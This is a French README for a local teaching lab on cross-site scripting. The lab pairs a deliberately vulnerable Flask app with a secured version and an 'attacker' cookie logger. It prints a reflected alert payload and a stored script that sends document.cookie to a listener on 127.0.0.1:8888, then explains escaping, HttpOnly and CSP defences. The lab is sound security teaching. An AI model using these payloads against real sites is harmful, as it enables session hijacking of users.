# ⚡ TP Pédagogique : Les Failles XSS (Cross-Site Scripting) & Défenses

> **Laboratoire Pratique de Cybersécurité Web**  
> **Avertissement** : Environnement strictement local et contrôlé à vocation pédagogique.

---

## 1. Introduction & Objectifs

Le **XSS (Cross-Site Scripting)** est l'une des vulnérabilités les plus répandues du web (Top 10 OWASP). Contrairement au CSRF où l'attaquant force l'envoi d'une requête sans exécuter de code dans le contexte de la cible, **le XSS permet d'injecter et d'exécuter du code JavaScript directement dans le navigateur des victimes au sein de l'origine de l'application légitime**.

Ce TP permet de démontrer :
1. **Le XSS Réfléchi (Reflected XSS)** : Injection non persistante via un paramètre HTTP GET.
2. **Le XSS Stocké (Stored XSS)** : Injection persistante en base/mémoire affectant tous les visiteurs.
3. **L'exfiltration de cookies en conditions réelles** vers un serveur pirate d'écoute C2 (Command & Control).
4. **Le lien critique XSS / CSRF** : Pourquoi le XSS permet d'annihiler et de contourner la protection par jeton anti-CSRF.
5. **Les contre-mesures industrielles** :
   - Échappement HTML contextuel (Entity Encoding).
   - L'attribut de cookie **`HttpOnly`**.
   - La politique de sécurité de contenu **CSP (`Content-Security-Policy`)**.

---

## 2. Architecture du Projet

```text
xss-tp/
├── README.md                  # Documentation technique complète
├── requirements.txt           # Dépendances (Flask, requests)
├── vulnerable/
│   └── app.py                 # Application vulnérable (Port 5000)
├── secure/
│   └── app_secure.py          # Application protégée (Port 5000)
├── attacker/
│   └── logger_server.py       # Serveur pirate C2 recevant les cookies (Port 8888)
├── tests/
│   └── test_xss.py            # Suite de tests unitaires et d'intégration
├── run_demo.bat               # Lanceur universel Windows
└── PIPELINE_DEMO.txt          # Guide pas à pas pour l'exposé
```

---

## 3. Lancer la Démonstration

Placez-vous dans le dossier :
```cmd
cd "xss-tp"
```

### Étape A : Lancer le scénario vulnérable
```cmd
.\run_demo.bat vulnerable
```
Deux fenêtres s'ouvrent :
- L'application cible sur **http://127.0.0.1:5000**
- Le serveur d'écoute pirate sur **http://127.0.0.1:8888**

### Étape B : Démos à montrer
1. **XSS Réfléchi** : Rendez-vous sur `http://127.0.0.1:5000/search` et injectez :
   ```html
   <script>alert('Faille XSS Réfléchi détectée !')</script>
   ```
2. **XSS Stocké & Vol de Session** :
   - Connectez-vous sur `http://127.0.0.1:5000/login` (identifiants de test : `user` / `password123`).
   - Allez sur le livre d'or `http://127.0.0.1:5000/guestbook`.
   - Postez ce message malveillant :
   ```html
   <script>fetch('http://127.0.0.1:8888/?cookie=' + encodeURIComponent(document.cookie));</script>
   ```
   - Observez le terminal du port 8888 : **le cookie de session s'affiche en clair chez le pirate !**

---

## 4. Démontrer les Défenses

Fermez les fenêtres et lancez la version sécurisée :
```cmd
.\run_demo.bat secure
```

1. **Échappement automatique** : Les balises `<script>` sont converties en `&lt;script&gt;` et s'affichent sous forme de texte inoffensif.
2. **Flag `HttpOnly`** : Empêche formellement JavaScript de lire `document.cookie`.
3. **CSP (`Content-Security-Policy`)** : Bloque l'exécution de tout script inline non autorisé.

---

## 5. Tests Automatisés

Pour valider l'ensemble des scénarios de manière industrielle :
```cmd
python tests/test_xss.py
```
Résultat : **5/5 tests validés avec succès** !
